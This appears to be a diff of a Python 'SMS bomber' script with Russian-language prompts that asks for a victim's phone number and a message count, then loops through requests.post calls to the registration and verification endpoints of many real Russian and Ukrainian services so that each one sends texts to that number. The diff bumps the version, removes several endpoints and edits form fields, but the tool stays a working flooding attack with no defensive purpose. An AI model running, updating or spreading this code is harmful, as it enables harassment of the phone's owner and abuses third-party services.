@@ -26,18 +26,11 @@ slowprint(colored('''
 ┃┗┻━┃┗━┛┣┛┗┛┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┗━━┫┃┃┗┓
 ┗━━━┻━━━┻━━━┻━━━┻━━━┻┛┗┛┗┻━━━┻━━━┻┛┗━┛
 by @lkqas
-beta version 1.0
+beta version 4.0
 ''','blue'))
-
-def slowprint(s):
-    for c in s + '\n' :
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(5. / 100)
 
 phone = input(colored('введите номер телефона +: ','red'))
 countT = input(colored('введите кол-во спама: ','green'))
-
 
 iteration = 0
 _name = ''
@@ -326,13 +319,6 @@ def infinity():
 			print('[+] Youla отправлено!')
 		except:
 			print('[-] Не отправлено!')
-
-		try:
-			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-			print('[+] Alpari отправлено!')
-		except:
-			print('[-] Не отправлено!')
-
 		try:
 			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
 			print('[+] SMS отправлено!')
@@ -416,25 +402,11 @@ def infinity():
 			print('[+] Tehnosvit отправлено!')
 		except:
 			print('[-] Tehnosvit Не отправлено!')
-
-		try:
-			requests.post('https://mobileplanet.ua/register', data={'klient_name':_nameRu,'klient_phone':'+'+_phone,'klient_email':_email})
-			print('[+] Mobileplanet отправлено!')
-		except:
-			print('[-] Mobileplanet Не отправлено!')
-
 		try:
 			requests.post('https://e-vse.online/mail2.php', data={'telephone':'+'+_phone})
 			print('[+] E-vse отправлено!')
 		except:
 			print('[-] E-vse Не отправлено!')
-
-		try:
-			requests.post('https://protovar.com.ua/aj_record', data={'object':'callback','user_name':_nameRu,'contact_phone':_phone[3:]})
-			print('[+] Protovar отправлено!')
-		except:
-			print('[-] Protovar Не отправлено!')
-
 		try:
 			requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
 			print('[+] Kasta отправлено!')
@@ -442,7 +414,7 @@ def infinity():
 			print('[-] Kasta Не отправлено!')
 
 		try:
-			requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name, 'telephone':_phone[2:], 'email':_email,'password':password,'form_key':'Zqqj7CyjkKG2ImM8'})
+			requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name, 'telephone':_phone[2:], 'password':password,'form_key':'Zqqj7CyjkKG2ImM8'})
 			print('[+] ALLO отправлено!')
 		except:
 			print('[-] ALLO Не отправлено!')
@@ -466,7 +438,7 @@ def infinity():
 			print('[-] Tinder Не отправлено!')
 
 		try:
-			requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,'registration_phone':_phone[2:],'registration_email':_email})
+			requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,'registration_phone':_phone[2:],})
 			print('[+] Comfy отправлено!')
 		except:
 			print('[-] Comfy Не отправлено!')
